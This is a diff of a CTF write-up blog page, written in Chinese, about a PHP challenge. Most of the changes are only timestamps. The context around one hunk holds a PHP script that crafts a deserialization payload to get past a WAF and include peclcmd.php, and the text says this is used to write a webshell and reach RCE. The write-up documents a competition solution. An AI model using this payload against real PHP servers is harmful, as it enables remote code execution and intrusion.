@@ -50,7 +50,7 @@
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250818143205875.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20250818143827548.png">
 <meta property="article:published_time" content="2025-08-18T11:07:05.000Z">
-<meta property="article:modified_time" content="2025-08-27T09:54:45.044Z">
+<meta property="article:modified_time" content="2025-12-08T10:31:26.037Z">
 <meta property="article:author" content="xiaolaisec">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="JAVA">
@@ -384,7 +384,7 @@
         <div class="label text-third-text-color text-sm">Categories</div>
     </a>
     <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
-        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">32</div>
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">42</div>
         <div class="label text-third-text-color text-sm">Posts</div>
     </a>
 </div>
@@ -438,8 +438,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-08-27 17:54:45</span>
-            <span class="mobile">2025-08-27 17:54:45</span>
+            <span class="desktop">2025-12-08 18:31:26</span>
+            <span class="mobile">2025-12-08 18:31:26</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -563,7 +563,7 @@
                 ></p>
 <h3 id="插一句-1"><a href="#插一句-1" class="headerlink" title="插一句"></a>插一句</h3><p>出题人的WAF没写完整</p>
 <p><code>$result = $this-&gt;prefix . &#39;lilctf&#39; . $this-&gt;suffix;</code>应该是<code>$result = $this-&gt;prefix . &#39;lilctf&#39; . $this-&gt;suffix . &#39;.php&#39;;</code></p>
-<p>预期是打&#x2F;usr&#x2F;local&#x2F;lib&#x2F;lilctf&#x2F;..&#x2F;php&#x2F;peclcmd.php（因为 pearcmd.php被禁了）写shell来RCE</p>
+<p>预期是打&#x2F;usr&#x2F;local&#x2F;lib&#x2F;lilctf&#x2F;..&#x2F;php&#x2F;peclcmd.php(即&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;peclcmd.php)（因为 pearcmd.php被禁了）写shell来RCE</p>
 <div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Access</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$prefix</span> = <span class="string">&#x27;/usr/local/lib/&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$suffix</span> = <span class="string">&#x27;/../php/peclcmd.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$token</span> = <span class="keyword">new</span> <span class="title class_">Access</span>();</span><br><span class="line"><span class="variable">$user</span>-&gt;username = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$token</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Access&quot;:2&#x27;</span>, <span class="string">&#x27;LilRan&quot;:3&#x27;</span>, <span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$ser</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="variable">$ser</span> .= <span class="string">&#x27;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:6:&quot;Access&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;value = <span class="variable">$ser</span>;</span><br><span class="line"><span class="variable">$userser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$userser</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;s:5:&quot;admin&quot;&#x27;</span>, <span class="string">&#x27;;S:5:&quot;\61dmin&quot;&#x27;</span>, <span class="variable">$userser</span>);</span><br><span class="line"><span class="variable">$fin</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$userser</span>, <span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$fin</span>) . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure></div>
 
 <p>发两次，一次写shell，一次拿flag</p>
@@ -721,7 +721,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-08-27 17:54:45
+                    :</strong> 2025-12-08 18:31:26
             </li>
         
         <li>
@@ -884,7 +884,7 @@
               <span>2022</span>
               -
             
-            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
         </div>
         
             <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
